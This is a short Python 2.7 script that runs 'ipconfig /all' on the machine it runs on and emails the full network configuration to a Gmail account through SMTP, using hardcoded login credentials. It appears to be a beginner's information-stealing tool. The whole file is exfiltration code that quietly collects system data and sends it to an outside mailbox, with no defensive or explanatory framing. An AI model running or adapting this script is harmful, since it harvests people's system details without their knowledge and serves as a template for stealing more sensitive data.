#!/usr/bin/python2.7

import subprocess
import smtplib

def send_mail(email,password,message):

	server = smtplib.SMTP_SSL('smtp.gmail.com',465)
	server.login(email,password)
	server.sendmail(email,email,message)
	server.quit()

command = "ipconfig /all"
result = subprocess.check_output(command,shell=True)
print result
send_mail("ddddd@gmail.com","380ddddd68dd8000",result)
